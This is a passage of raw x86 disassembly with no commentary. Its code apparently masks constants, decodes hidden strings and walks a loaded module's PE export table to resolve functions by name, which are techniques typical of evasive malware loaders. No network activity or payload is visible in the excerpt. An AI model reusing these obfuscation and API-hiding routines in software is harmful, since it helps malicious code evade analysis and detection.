  418e4b:	mov    ebp,esp
  418e4d:	sub    esp,0x18
  418e50:	mov    DWORD PTR [ebp-0x14],0xf89c8585
  418e57:	mov    DWORD PTR [ebp-0x18],0xf89c8584
  418e5e:	mov    eax,DWORD PTR [ebp-0x14]
  418e61:	xor    eax,0x751089b
  418e66:	add    eax,0x3272e2
  418e6b:	mov    DWORD PTR [ebp-0x8],eax
  418e6e:	mov    DWORD PTR [ebp-0x10],0xf89c85bd
  418e75:	mov    DWORD PTR [ebp-0xc],0xf89c85b9
  418e7c:	mov    DWORD PTR [ebp-0x4],0xf89c85bb
  418e83:	mov    eax,DWORD PTR [ebp-0x14]
  418e86:	xor    eax,0x751089b
  418e8b:	mov    ecx,DWORD PTR [ebp-0x8]
  418e8e:	lea    eax,[ecx+eax*1+0x3272e2]
  418e95:	mov    ecx,DWORD PTR [ebp-0x18]
  418e98:	xor    ecx,0x751089b
  418e9e:	add    ecx,0x3272e2
  418ea4:	mov    edx,DWORD PTR [ebp+0x10]
  418ea7:	imul   edx,ecx
  418eaa:	cmp    eax,edx
  418eac:	jae    0x418f9f
  418eb2:	mov    eax,DWORD PTR [ebp+0x10]
  418eb5:	mov    ecx,DWORD PTR [ebp-0x8]
  418eb8:	sub    eax,ecx
  418eba:	mov    ecx,DWORD PTR [ebp-0x10]
  418ebd:	xor    ecx,0x751089b
  418ec3:	add    ecx,0x3272e2
  418ec9:	cmp    eax,ecx
  418ecb:	jbe    0x418efd
  418ecd:	mov    eax,DWORD PTR [ebp+0x8]
  418ed0:	add    eax,DWORD PTR [ebp-0x8]
  418ed3:	mov    ecx,DWORD PTR [ebp+0xc]
  418ed6:	add    ecx,DWORD PTR [ebp-0x8]
  418ed9:	mov    edx,DWORD PTR [ecx]
  418edb:	mov    DWORD PTR [eax],edx
  418edd:	mov    ecx,DWORD PTR [ecx+0x4]
  418ee0:	mov    DWORD PTR [eax+0x4],ecx
  418ee3:	mov    eax,DWORD PTR [ebp-0x10]
  418ee6:	xor    eax,0x751089b
  418eeb:	mov    ecx,DWORD PTR [ebp-0x8]
  418eee:	lea    eax,[ecx+eax*1+0x3272e2]
  418ef5:	mov    DWORD PTR [ebp-0x8],eax
  418ef8:	jmp    0x418f9a
  418efd:	mov    eax,DWORD PTR [ebp+0x10]
  418f00:	mov    ecx,DWORD PTR [ebp-0x8]
  418f03:	sub    eax,ecx
  418f05:	mov    ecx,DWORD PTR [ebp-0xc]
  418f08:	xor    ecx,0x751089b
  418f0e:	add    ecx,0x3272e2
  418f14:	cmp    eax,ecx
  418f16:	jbe    0x418f3f
  418f18:	mov    eax,DWORD PTR [ebp+0x8]
  418f1b:	add    eax,DWORD PTR [ebp-0x8]
  418f1e:	mov    ecx,DWORD PTR [ebp+0xc]
  418f21:	add    ecx,DWORD PTR [ebp-0x8]
  418f24:	mov    ecx,DWORD PTR [ecx]
  418f26:	mov    DWORD PTR [eax],ecx
  418f28:	mov    eax,DWORD PTR [ebp-0xc]
  418f2b:	xor    eax,0x751089b
  418f30:	mov    ecx,DWORD PTR [ebp-0x8]
  418f33:	lea    eax,[ecx+eax*1+0x3272e2]
  418f3a:	mov    DWORD PTR [ebp-0x8],eax
  418f3d:	jmp    0x418f9a
  418f3f:	mov    eax,DWORD PTR [ebp+0x10]
  418f42:	mov    ecx,DWORD PTR [ebp-0x8]
  418f45:	sub    eax,ecx
  418f47:	mov    ecx,DWORD PTR [ebp-0x4]
  418f4a:	xor    ecx,0x751089b
  418f50:	add    ecx,0x3272e2
  418f56:	cmp    eax,ecx
  418f58:	jbe    0x418f83
  418f5a:	mov    eax,DWORD PTR [ebp+0x8]
  418f5d:	add    eax,DWORD PTR [ebp-0x8]
  418f60:	mov    ecx,DWORD PTR [ebp+0xc]
  418f63:	add    ecx,DWORD PTR [ebp-0x8]
  418f66:	mov    cx,WORD PTR [ecx]
  418f69:	mov    WORD PTR [eax],cx
  418f6c:	mov    eax,DWORD PTR [ebp-0x4]
  418f6f:	xor    eax,0x751089b
  418f74:	mov    ecx,DWORD PTR [ebp-0x8]
  418f77:	lea    eax,[ecx+eax*1+0x3272e2]
  418f7e:	mov    DWORD PTR [ebp-0x8],eax
  418f81:	jmp    0x418f9a
  418f83:	mov    eax,DWORD PTR [ebp+0x8]
  418f86:	add    eax,DWORD PTR [ebp-0x8]
  418f89:	mov    ecx,DWORD PTR [ebp+0xc]
  418f8c:	add    ecx,DWORD PTR [ebp-0x8]
  418f8f:	mov    cl,BYTE PTR [ecx]
  418f91:	mov    BYTE PTR [eax],cl
  418f93:	mov    eax,DWORD PTR [ebp-0x8]
  418f96:	inc    eax
  418f97:	mov    DWORD PTR [ebp-0x8],eax
  418f9a:	jmp    0x418e83
  418f9f:	leave  
  418fa0:	ret    0xc
  418fa3:	push   ebp
  418fa4:	mov    ebp,esp
  418fa6:	sub    esp,0xc
  418fa9:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  418fb0:	push   esi
  418fb1:	mov    esi,eax
  418fb3:	mov    DWORD PTR [ebp-0x8],0xf89c8584
  418fba:	mov    edx,DWORD PTR [ebp-0x4]
  418fbd:	mov    eax,0x751089b
  418fc2:	xor    edx,eax
  418fc4:	mov    ecx,0x3272e2
  418fc9:	add    edx,ecx
  418fcb:	cmp    esi,edx
  418fcd:	je     0x41900f
  418fcf:	push   ebx
  418fd0:	push   edi
  418fd1:	mov    edx,DWORD PTR [ebp-0x8]
  418fd4:	mov    ebx,DWORD PTR [ebp+0x8]
  418fd7:	xor    edx,eax
  418fd9:	mov    edi,0xffcd8d1e
  418fde:	sub    edi,edx
  418fe0:	add    esi,edi
  418fe2:	lea    edx,[esi-0x3272e2]
  418fe8:	xor    edx,eax
  418fea:	mov    DWORD PTR [ebp-0xc],edx
  418fed:	mov    edx,DWORD PTR [ebp-0x4]
  418ff0:	mov    edi,DWORD PTR [ebp-0xc]
  418ff3:	xor    dl,0x9b
  418ff6:	sub    dl,0x1e
  418ff9:	xor    edi,eax
  418ffb:	mov    BYTE PTR [edi+ebx*1+0x3272e2],dl
  419002:	mov    edx,DWORD PTR [ebp-0x4]
  419005:	xor    edx,eax
  419007:	add    edx,ecx
  419009:	cmp    esi,edx
  41900b:	jne    0x418fd1
  41900d:	pop    edi
  41900e:	pop    ebx
  41900f:	pop    esi
  419010:	leave  
  419011:	ret    0x4
  419014:	push   ebp
  419015:	mov    ebp,esp
  419017:	sub    esp,0x21c
  41901d:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  419024:	mov    DWORD PTR [ebp-0x14],0xf89c8584
  41902b:	mov    eax,DWORD PTR [ebp+0x10]
  41902e:	mov    eax,DWORD PTR [ebp-0x4]
  419031:	mov    ecx,DWORD PTR [ebp+0x8]
  419034:	push   esi
  419035:	push   edi
  419036:	mov    edi,0x751089b
  41903b:	xor    eax,edi
  41903d:	mov    esi,0x3272e2
  419042:	add    eax,esi
  419044:	cmp    eax,ecx
  419046:	mov    eax,DWORD PTR [ebp-0x4]
  419049:	jne    0x419054
  41904b:	xor    eax,edi
  41904d:	add    eax,esi
  41904f:	jmp    0x419100
  419054:	mov    ecx,DWORD PTR [ebp+0xc]
  419057:	xor    eax,edi
  419059:	add    eax,esi
  41905b:	cmp    eax,ecx
  41905d:	jne    0x419064
  41905f:	mov    eax,DWORD PTR [ebp-0x4]
  419062:	jmp    0x41904b
  419064:	lea    eax,[ebp-0x21c]
  41906a:	mov    DWORD PTR [ebp-0x8],eax
  41906d:	mov    eax,DWORD PTR [ebp+0xc]
  419070:	mov    DWORD PTR [ebp-0x10],eax
  419073:	mov    eax,DWORD PTR [ebp-0x4]
  419076:	xor    eax,edi
  419078:	add    eax,esi
  41907a:	mov    DWORD PTR [ebp+0x10],eax
  41907d:	mov    eax,DWORD PTR [ebp+0xc]
  419080:	push   ebx
  419081:	call   0x418d5c
  419086:	mov    ebx,eax
  419088:	mov    eax,DWORD PTR [ebp+0x8]
  41908b:	mov    eax,DWORD PTR [eax+0x14]
  41908e:	jmp    0x4190e8
  419090:	mov    eax,DWORD PTR [ebp+0xc]
  419093:	sub    eax,0x8
  419096:	mov    DWORD PTR [ebp-0xc],eax
  419099:	mov    eax,DWORD PTR [ebp-0xc]
  41909c:	mov    eax,DWORD PTR [eax+0x28]
  41909f:	call   0x418c44
  4190a4:	mov    DWORD PTR [ebp+0x10],eax
  4190a7:	push   DWORD PTR [ebp+0x10]
  4190aa:	mov    edx,DWORD PTR [ebp-0x8]
  4190ad:	call   0x418deb
  4190b2:	mov    eax,DWORD PTR [ebp-0x4]
  4190b5:	xor    eax,edi
  4190b7:	add    eax,esi
  4190b9:	cmp    eax,ebx
  4190bb:	jne    0x4190c5
  4190bd:	mov    eax,DWORD PTR [ebp-0x8]
  4190c0:	call   0x418cd2
  4190c5:	mov    eax,DWORD PTR [ebp-0x14]
  4190c8:	xor    eax,edi
  4190ca:	add    eax,esi
  4190cc:	push   eax
  4190cd:	push   DWORD PTR [ebp-0x10]
  4190d0:	mov    eax,DWORD PTR [ebp-0x8]
  4190d3:	call   0x4189fe
  4190d8:	mov    ecx,DWORD PTR [ebp-0x4]
  4190db:	xor    ecx,edi
  4190dd:	add    ecx,esi
  4190df:	cmp    eax,ecx
  4190e1:	je     0x419106
  4190e3:	mov    eax,DWORD PTR [ebp+0xc]
  4190e6:	mov    eax,DWORD PTR [eax]
  4190e8:	mov    DWORD PTR [ebp+0xc],eax
  4190eb:	mov    eax,DWORD PTR [ebp+0x8]
  4190ee:	mov    ecx,DWORD PTR [ebp+0xc]
  4190f1:	add    eax,0x14
  4190f4:	cmp    ecx,eax
  4190f6:	jne    0x419090
  4190f8:	mov    eax,DWORD PTR [ebp-0x4]
  4190fb:	xor    eax,edi
  4190fd:	add    eax,esi
  4190ff:	pop    ebx
  419100:	pop    edi
  419101:	pop    esi
  419102:	leave  
  419103:	ret    0xc
  419106:	mov    eax,DWORD PTR [ebp-0xc]
  419109:	mov    eax,DWORD PTR [eax+0x18]
  41910c:	jmp    0x4190ff
  41910e:	push   ebp
  41910f:	mov    ebp,esp
  419111:	mov    eax,DWORD PTR [ebp+0xc]
  419114:	sub    esp,0x10
  419117:	cmp    DWORD PTR [ebp+0x8],0x0
  41911b:	push   ebx
  41911c:	push   esi
  41911d:	push   edi
  41911e:	je     0x4191d3
  419124:	test   eax,eax
  419126:	je     0x4191d3
  41912c:	movzx  eax,WORD PTR [eax+0x20]
  419130:	mov    ecx,eax
  419132:	mov    DWORD PTR [ebp-0x10],eax
  419135:	xor    edx,edx
  419137:	and    DWORD PTR [ebp-0x8],edx
  41913a:	mov    eax,0x8a8d
  41913f:	xor    ecx,eax
  419141:	add    ecx,0x3b51
  419147:	mov    DWORD PTR [ebp-0xc],ecx
  41914a:	and    DWORD PTR [ebp-0x4],0x0
  41914e:	xor    ecx,ecx
  419150:	push   0x7e
  419152:	pop    edi
  419153:	cmp    cx,WORD PTR [ebp-0xc]
  419157:	jae    0x4191bd
  419159:	lea    esi,[edx-0x3b51]
  41915f:	xor    esi,eax
  419161:	movzx  ecx,WORD PTR [ebp-0x4]
  419165:	mov    ebx,DWORD PTR [ebp+0xc]
  419168:	lea    ecx,[ebx+ecx*4]
  41916b:	cmp    WORD PTR [ecx+0x2],si
  41916f:	jne    0x4191a8
  419171:	movzx  ecx,WORD PTR [ecx]
  419174:	mov    edi,0x4e22
  419179:	cmp    cx,di
  41917c:	jne    0x41918a
  41917e:	mov    ebx,DWORD PTR [ebp+0x8]
  419181:	movzx  edi,dx
  419184:	cmp    BYTE PTR [edi+ebx*1],0x0
  419188:	je     0x4191b7
  41918a:	mov    ebx,DWORD PTR [ebp+0x8]
  41918d:	movzx  edi,dx
  419190:	movsx  di,BYTE PTR [edi+ebx*1]
  419195:	mov    ebx,0x3b51
  41919a:	sub    di,bx
  41919d:	xor    di,ax
  4191a0:	cmp    cx,di
  4191a3:	je     0x4191b7
  4191a5:	push   0x7c
  4191a7:	pop    edi
  4191a8:	inc    DWORD PTR [ebp-0x4]
  4191ab:	mov    cx,WORD PTR [ebp-0xc]
  4191af:	cmp    WORD PTR [ebp-0x4],cx
  4191b3:	jb     0x419161
  4191b5:	jmp    0x4191bd
  4191b7:	inc    DWORD PTR [ebp-0x8]
  4191ba:	push   0x7d
  4191bc:	pop    edi
  4191bd:	mov    esi,DWORD PTR [ebp+0x8]
  4191c0:	movzx  ecx,dx
  4191c3:	cmp    BYTE PTR [ecx+esi*1],0x0
  4191c7:	je     0x4191dc
  4191c9:	inc    edx
  4191ca:	cmp    edi,0x7c
  4191cd:	jne    0x41914a
  4191d3:	xor    eax,eax
  4191d5:	pop    edi
  4191d6:	pop    esi
  4191d7:	pop    ebx
  4191d8:	leave  
  4191d9:	ret    0x8
  4191dc:	mov    ecx,DWORD PTR [ebp-0x8]
  4191df:	add    ecx,0xffffc4af
  4191e5:	xor    cx,ax
  4191e8:	xor    eax,eax
  4191ea:	cmp    cx,WORD PTR [ebp-0x10]
  4191ee:	sete   al
  4191f1:	jmp    0x4191d5
  4191f3:	push   ebp
  4191f4:	mov    ebp,esp
  4191f6:	sub    esp,0x50
  4191f9:	push   edi
  4191fa:	mov    edi,eax
  4191fc:	mov    eax,DWORD PTR [edi+0x1a8]
  419202:	cmp    DWORD PTR [eax],0x0
  419205:	jne    0x41920e
  419207:	xor    eax,eax
  419209:	jmp    0x41933f
  41920e:	push   DWORD PTR [ebp+0x8]
  419211:	push   0x2c
  419213:	pop    eax
  419214:	call   0x418fa3
  419219:	mov    edx,DWORD PTR [edi+0x1ac]
  41921f:	lea    eax,[edi+0x22]
  419222:	mov    DWORD PTR [ebp-0x4c],eax
  419225:	lea    eax,[edi+0x44]
  419228:	mov    DWORD PTR [ebp-0x48],eax
  41922b:	lea    eax,[edi+0x66]
  41922e:	mov    DWORD PTR [ebp-0x44],eax
  419231:	lea    eax,[edi+0x88]
  419237:	mov    DWORD PTR [ebp-0x40],eax
  41923a:	lea    eax,[edi+0xaa]
  419240:	mov    DWORD PTR [ebp-0x3c],eax
  419243:	lea    eax,[edi+0xcc]
  419249:	mov    DWORD PTR [ebp-0x38],eax
  41924c:	lea    eax,[edi+0xee]
  419252:	mov    DWORD PTR [ebp-0x34],eax
  419255:	lea    eax,[edi+0x110]
  41925b:	mov    DWORD PTR [ebp-0x30],eax
  41925e:	lea    eax,[edi+0x132]
  419264:	mov    DWORD PTR [ebp-0x2c],eax
  419267:	lea    eax,[edi+0x154]
  41926d:	push   edi
  41926e:	mov    DWORD PTR [ebp-0x50],edi
  419271:	mov    DWORD PTR [ebp-0x28],eax
  419274:	call   0x419373
  419279:	push   eax
  41927a:	mov    eax,DWORD PTR [edi+0x1a8]
  419280:	push   DWORD PTR [eax]
  419282:	call   0x419014
  419287:	mov    DWORD PTR [ebp-0x10],eax
  41928a:	test   eax,eax
  41928c:	je     0x41933f
  419292:	mov    ecx,DWORD PTR [eax+0x3c]
  419295:	push   ebx
  419296:	push   esi
  419297:	mov    esi,DWORD PTR [ecx+eax*1+0x78]
  41929b:	add    esi,eax
  41929d:	mov    edi,DWORD PTR [esi+0x24]
  4192a0:	mov    ecx,DWORD PTR [esi+0x1c]
  4192a3:	mov    edx,DWORD PTR [esi+0x20]
  4192a6:	mov    ebx,DWORD PTR [esi+0x18]
  4192a9:	add    edi,eax
  4192ab:	mov    DWORD PTR [ebp-0x20],edi
  4192ae:	mov    edi,DWORD PTR [esi+0x14]
  4192b1:	add    ecx,eax
  4192b3:	add    edx,eax
  4192b5:	mov    DWORD PTR [ebp-0xc],ecx
  4192b8:	mov    DWORD PTR [ebp-0x1c],edx
  4192bb:	mov    DWORD PTR [ebp-0x8],edi
  4192be:	cmp    edi,ebx
  4192c0:	ja     0x4192c5
  4192c2:	mov    DWORD PTR [ebp-0x8],ebx
  4192c5:	xor    ebx,ebx
  4192c7:	mov    DWORD PTR [ebp-0x18],ebx
  4192ca:	cmp    DWORD PTR [ebp-0x8],ebx
  4192cd:	jbe    0x41933d
  4192cf:	jmp    0x4192d4
  4192d1:	mov    edx,DWORD PTR [ebp-0x1c]
  4192d4:	mov    edi,DWORD PTR [ebp-0x20]
  4192d7:	movzx  edi,WORD PTR [edi+ebx*2]
  4192db:	cmp    ebx,DWORD PTR [esi+0x18]
  4192de:	jae    0x41933d
  4192e0:	cmp    edi,DWORD PTR [esi+0x14]
  4192e3:	jae    0x41933d
  4192e5:	mov    ebx,DWORD PTR [edx+ebx*4]
  4192e8:	mov    edx,DWORD PTR [ebp+0x8]
  4192eb:	mov    edi,DWORD PTR [ecx+edi*4]
  4192ee:	mov    DWORD PTR [ebp-0x4],edx
  4192f1:	lea    edx,[ebp-0x50]
  4192f4:	add    ebx,eax
  4192f6:	add    edi,eax
  4192f8:	sub    edx,DWORD PTR [ebp+0x8]
  4192fb:	mov    DWORD PTR [ebp-0x14],0xb
  419302:	mov    DWORD PTR [ebp-0x24],edx
  419305:	mov    edx,DWORD PTR [ebp-0x4]
  419308:	cmp    DWORD PTR [edx],0x0
  41930b:	jne    0x419328
  41930d:	mov    eax,DWORD PTR [ebp-0x24]
  419310:	push   DWORD PTR [eax+edx*1]
  419313:	push   ebx
  419314:	call   0x41910e
  419319:	mov    ecx,DWORD PTR [ebp-0xc]
  41931c:	test   eax,eax
  41931e:	je     0x419325
  419320:	mov    eax,DWORD PTR [ebp-0x4]
  419323:	mov    DWORD PTR [eax],edi
  419325:	mov    eax,DWORD PTR [ebp-0x10]
  419328:	add    DWORD PTR [ebp-0x4],0x4
  41932c:	dec    DWORD PTR [ebp-0x14]
  41932f:	jne    0x419305
  419331:	mov    ebx,DWORD PTR [ebp-0x18]
  419334:	inc    ebx
  419335:	mov    DWORD PTR [ebp-0x18],ebx
  419338:	cmp    ebx,DWORD PTR [ebp-0x8]
  41933b:	jb     0x4192d1
  41933d:	pop    esi
  41933e:	pop    ebx
  41933f:	pop    edi
  419340:	leave  
  419341:	ret    0x4
  419344:	push   ebp
  419345:	mov    ebp,esp
  419347:	mov    eax,DWORD PTR [ebp+0x8]
  41934a:	push   esi
  41934b:	push   DWORD PTR [eax+0x1d8]
  419351:	lea    esi,[eax+0x198]
  419357:	mov    eax,DWORD PTR [ebp+0x8]
  41935a:	call   0x4191f3
  41935f:	mov    ecx,DWORD PTR [esi]
  419361:	mov    DWORD PTR [ecx],eax
  419363:	mov    eax,DWORD PTR [esi]
  419365:	xor    ecx,ecx
  419367:	cmp    DWORD PTR [eax],ecx
  419369:	pop    esi
  41936a:	setne  cl
  41936d:	mov    eax,ecx
  41936f:	pop    ebp
  419370:	ret    0x4
  419373:	mov    ecx,DWORD PTR [edi+0x188]
  419379:	push   ebx
  41937a:	jmp    0x41938f
  41937c:	xor    eax,0x8a8d
  419381:	add    eax,0x3b51
  419386:	mov    WORD PTR [ecx],ax
  419389:	add    ecx,0x2
  41938c:	add    edx,0x2
  41938f:	movzx  eax,WORD PTR [edx]
  419392:	mov    ebx,0x4e22
  419397:	cmp    ax,bx
  41939a:	jne    0x41937c
  41939c:	xor    eax,eax
  41939e:	mov    WORD PTR [ecx],ax
  4193a1:	mov    eax,DWORD PTR [edi+0x188]
  4193a7:	pop    ebx
  4193a8:	ret    
  4193a9:	push   edi
  4193aa:	mov    edi,eax
  4193ac:	mov    eax,DWORD PTR [esi+0x188]
  4193b2:	shl    edi,0x6
  4193b5:	add    eax,edi
  4193b7:	jmp    0x4193c3
  4193b9:	xor    cl,0x74
  4193bc:	sub    cl,0x8
  4193bf:	mov    BYTE PTR [eax],cl
  4193c1:	inc    eax
  4193c2:	inc    edx
  4193c3:	mov    cl,BYTE PTR [edx]
  4193c5:	cmp    cl,0x7c
  4193c8:	jne    0x4193b9
  4193ca:	mov    BYTE PTR [eax],0x0
  4193cd:	mov    eax,DWORD PTR [esi+0x188]
  4193d3:	add    eax,edi
  4193d5:	pop    edi
  4193d6:	ret    
  4193d7:	push   ebp
  4193d8:	mov    ebp,esp
  4193da:	sub    esp,0x38
  4193dd:	push   ebx
  4193de:	mov    ebx,0xf89c8585
  4193e3:	mov    DWORD PTR [ebp-0x4],ebx
  4193e6:	lea    eax,[ebx-0x1]
  4193e9:	push   esi
  4193ea:	mov    DWORD PTR [ebp-0x24],eax
  4193ed:	mov    ecx,DWORD PTR [ebp-0x4]
  4193f0:	mov    edx,DWORD PTR [ebp+0x8]
  4193f3:	mov    esi,0x751089b
  4193f8:	push   edi
  4193f9:	xor    ecx,esi
  4193fb:	mov    edi,0x3272e2
  419400:	add    ecx,edi
  419402:	cmp    edx,ecx
  419404:	je     0x419572
  41940a:	mov    ecx,DWORD PTR [ebp-0x4]
  41940d:	mov    edx,DWORD PTR [ebp+0xc]
  419410:	xor    ecx,esi
  419412:	add    ecx,edi
  419414:	cmp    edx,ecx
  419416:	je     0x419572
  41941c:	mov    ecx,DWORD PTR [ebp+0x10]
  41941f:	mov    DWORD PTR [ebp-0x18],ecx
  419422:	mov    ecx,DWORD PTR [ebp+0xc]
  419425:	mov    DWORD PTR [ebp-0x14],ecx
  419428:	mov    ecx,DWORD PTR [ebp+0x8]
  41942b:	mov    DWORD PTR [ebp-0x1c],0xf89c8507
  419432:	mov    DWORD PTR [ebp-0x20],eax
  419435:	mov    DWORD PTR [ebp-0x10],ebx
  419438:	mov    DWORD PTR [ebp+0xc],eax
  41943b:	mov    DWORD PTR [ebp+0x10],0xf89c85bb
  419442:	mov    eax,DWORD PTR [ebp+0xc]
  419445:	mov    DWORD PTR [ebp-0xc],ecx
  419448:	xor    eax,esi
  41944a:	mov    ecx,0xffcd8d1e
  41944f:	sub    ecx,eax
  419451:	add    ecx,DWORD PTR [ebp-0x14]
  419454:	mov    DWORD PTR [ebp+0x8],ecx
  419457:	mov    DWORD PTR [ebp-0x8],0xf89c85b8
  41945e:	jmp    0x419562
  419463:	mov    eax,DWORD PTR [ebp+0xc]
  419466:	mov    ecx,DWORD PTR [ebp+0xc]
  419469:	xor    eax,esi
  41946b:	xor    ecx,esi
  41946d:	lea    ecx,[eax+ecx*1+0x64e5c4]
  419474:	mov    eax,DWORD PTR [ebp+0x8]
  419477:	xor    edx,edx
  419479:	div    ecx
  41947b:	mov    eax,DWORD PTR [ebp+0x10]
  41947e:	mov    ecx,DWORD PTR [ebp+0xc]
  419481:	xor    eax,esi
  419483:	xor    ecx,esi
  419485:	sub    eax,ecx
  419487:	cmp    edx,eax
  419489:	jne    0x41951e
  41948f:	mov    eax,DWORD PTR [ebp+0x8]
  419492:	add    eax,DWORD PTR [ebp-0xc]
  419495:	mov    dl,BYTE PTR [eax]
  419497:	mov    eax,DWORD PTR [ebp-0x10]
  41949a:	mov    ecx,DWORD PTR [ebp-0x8]
  41949d:	xor    eax,esi
  41949f:	xor    ecx,esi
  4194a1:	add    eax,edi
  4194a3:	add    ecx,edi
  4194a5:	cmp    eax,ecx
  4194a7:	jae    0x4194ef
  4194a9:	lea    ecx,[eax-0x3272e2]
  4194af:	mov    DWORD PTR [ebp-0x4],ecx
  4194b2:	mov    ebx,DWORD PTR [ebp-0x4]
  4194b5:	xor    ebx,esi
  4194b7:	add    ebx,0x7f55d8fb
  4194bd:	lea    ecx,[ebp+eax*4-0x38]
  4194c1:	mov    DWORD PTR [ecx],ebx
  4194c3:	mov    ebx,DWORD PTR [ecx]
  4194c5:	cmp    ebx,0x244ecbda
  4194cb:	jbe    0x4194d5
  4194cd:	add    DWORD PTR [ecx],0x405fc19
  4194d3:	jmp    0x4194db
  4194d5:	add    DWORD PTR [ecx],0xfdaf43e7
  4194db:	mov    ecx,DWORD PTR [ebp-0x8]
  4194de:	xor    ecx,esi
  4194e0:	inc    eax
  4194e1:	inc    DWORD PTR [ebp-0x4]
  4194e4:	add    ecx,edi
  4194e6:	cmp    eax,ecx
  4194e8:	jb     0x4194b2
  4194ea:	mov    ebx,0xf89c8585
  4194ef:	mov    eax,DWORD PTR [ebp-0x18]
  4194f2:	test   eax,eax
  4194f4:	jne    0x4194fe
  4194f6:	xor    dl,0x74
  4194f9:	sub    dl,0x8
  4194fc:	jmp    0x419514
  4194fe:	mov    eax,DWORD PTR [ebp-0x1c]
  419501:	xor    al,0x9b
  419503:	mov    cl,0x1e
  419505:	sub    cl,al
  419507:	add    dl,cl
  419509:	mov    ecx,DWORD PTR [ebp-0x20]
  41950c:	xor    cl,0x9b
  41950f:	sub    cl,0x1e
  419512:	ror    dl,cl
  419514:	xor    eax,eax
  419516:	mov    eax,DWORD PTR [ebp+0x8]
  419519:	add    eax,DWORD PTR [ebp-0xc]
  41951c:	mov    BYTE PTR [eax],dl
  41951e:	mov    eax,DWORD PTR [ebp+0x8]
  419521:	mov    ecx,DWORD PTR [ebp-0x10]
  419524:	sub    eax,edi
  419526:	xor    eax,esi
  419528:	cmp    eax,ecx
  41952a:	jne    0x419550
  41952c:	mov    eax,DWORD PTR [ebp+0x10]
  41952f:	mov    ecx,DWORD PTR [ebp+0xc]
  419532:	xor    eax,esi
  419534:	xor    ecx,esi
  419536:	sub    eax,ecx
  419538:	sub    eax,edi
  41953a:	xor    eax,esi
  41953c:	mov    DWORD PTR [ebp+0x10],eax
  41953f:	mov    eax,DWORD PTR [ebp+0xc]
  419542:	xor    eax,esi
  419544:	mov    ecx,0xffcd8d1e
  419549:	sub    ecx,eax
  41954b:	add    ecx,DWORD PTR [ebp-0x14]
  41954e:	jmp    0x41955f
  419550:	mov    eax,DWORD PTR [ebp+0xc]
  419553:	xor    eax,esi
  419555:	mov    ecx,0xffcd8d1e
  41955a:	sub    ecx,eax
  41955c:	add    ecx,DWORD PTR [ebp+0x8]
  41955f:	mov    DWORD PTR [ebp+0x8],ecx
  419562:	mov    eax,DWORD PTR [ebp+0x10]
  419565:	cmp    eax,ebx
  419567:	jne    0x419463
  41956d:	mov    eax,DWORD PTR [ebp-0x24]
  419570:	jmp    0x419575
  419572:	mov    eax,DWORD PTR [ebp-0x4]
  419575:	xor    eax,esi
  419577:	add    eax,edi
  419579:	pop    edi
  41957a:	pop    esi
  41957b:	pop    ebx
  41957c:	leave  
  41957d:	ret    0xc
  419580:	push   ebp
  419581:	mov    ebp,esp
  419583:	sub    esp,0x14
  419586:	mov    DWORD PTR [ebp-0x10],0xf89c8585
  41958d:	mov    DWORD PTR [ebp-0x4],0xf89c8584
  419594:	mov    eax,DWORD PTR [ebx]
  419596:	mov    DWORD PTR [ebp-0x8],eax
  419599:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  4195a0:	push   esi
  4195a1:	push   edi
  4195a2:	mov    DWORD PTR [ebp-0x14],0xead718a5
  4195a9:	mov    edi,DWORD PTR [ebp-0x4]
  4195ac:	mov    ecx,DWORD PTR [ebp-0x10]
  4195af:	mov    eax,0x751089b
  4195b4:	xor    edi,eax
  4195b6:	mov    edx,0x3272e2
  4195bb:	xor    ecx,eax
  4195bd:	add    edi,edx
  4195bf:	add    ecx,edx
  4195c1:	imul   edi,ecx
  4195c4:	jmp    0x41960c
  4195c6:	mov    ecx,DWORD PTR [ebp-0x8]
  4195c9:	mov    esi,DWORD PTR [ebp-0x4]
  4195cc:	xor    ecx,eax
  4195ce:	xor    esi,eax
  4195d0:	add    ecx,edx
  4195d2:	add    esi,edx
  4195d4:	test   esi,ecx
  4195d6:	mov    esi,DWORD PTR [ebp-0x8]
  4195d9:	mov    ecx,DWORD PTR [ebp-0x4]
  4195dc:	je     0x4195f3
  4195de:	xor    ecx,eax
  4195e0:	xor    esi,eax
  4195e2:	add    ecx,edx
  4195e4:	add    esi,edx
  4195e6:	shr    esi,cl
  4195e8:	mov    ecx,DWORD PTR [ebp-0x14]
  4195eb:	xor    ecx,eax
  4195ed:	add    ecx,edx
  4195ef:	xor    esi,ecx
  4195f1:	jmp    0x4195fd
  4195f3:	xor    esi,eax
  4195f5:	xor    ecx,eax
  4195f7:	add    esi,edx
  4195f9:	add    ecx,edx
  4195fb:	shr    esi,cl
  4195fd:	mov    DWORD PTR [ebp-0x8],esi
  419600:	mov    ecx,DWORD PTR [ebp-0x4]
  419603:	xor    ecx,eax
  419605:	lea    edi,[edi+ecx*1+0x3272e2]
  41960c:	mov    ecx,DWORD PTR [ebp-0xc]
  41960f:	mov    esi,DWORD PTR [ebp-0x4]
  419612:	xor    esi,eax
  419614:	xor    ecx,eax
  419616:	sub    ecx,esi
  419618:	cmp    edi,ecx
  41961a:	jbe    0x4195c6
  41961c:	mov    eax,DWORD PTR [ebp-0x8]
  41961f:	pop    edi
  419620:	mov    DWORD PTR [ebx],eax
  419622:	mov    eax,DWORD PTR [ebp-0x8]
  419625:	pop    esi
  419626:	leave  
  419627:	ret    
  419628:	push   ebp
  419629:	mov    ebp,esp
  41962b:	sub    esp,0x420
  419631:	mov    DWORD PTR [ebp-0x14],0xf89c8585
  419638:	mov    DWORD PTR [ebp-0xc],0xf89c8584
  41963f:	mov    DWORD PTR [ebp-0x18],0xf89c8685
  419646:	push   ebx
  419647:	mov    DWORD PTR [ebp-0x1c],0xf89c8586
  41964e:	mov    eax,DWORD PTR [ebp-0x14]
  419651:	push   esi
  419652:	mov    esi,0x751089b
  419657:	push   edi
  419658:	xor    eax,esi
  41965a:	mov    edi,0x3272e2
  41965f:	add    eax,edi
  419661:	mov    DWORD PTR [ebp-0x8],eax
  419664:	mov    DWORD PTR [ebp-0x20],0xf89c85bd
  41966b:	mov    DWORD PTR [ebp-0x4],0xead718a5
  419672:	mov    DWORD PTR [ebp-0x10],0x8
  419679:	mov    ecx,ecx
  41967b:	mov    eax,DWORD PTR [ebp-0xc]
  41967e:	mov    ecx,DWORD PTR [ebp-0x14]
  419681:	xor    eax,esi
  419683:	xor    ecx,esi
  419685:	add    eax,edi
  419687:	add    ecx,edi
  419689:	imul   eax,ecx
  41968c:	jmp    0x4196bf
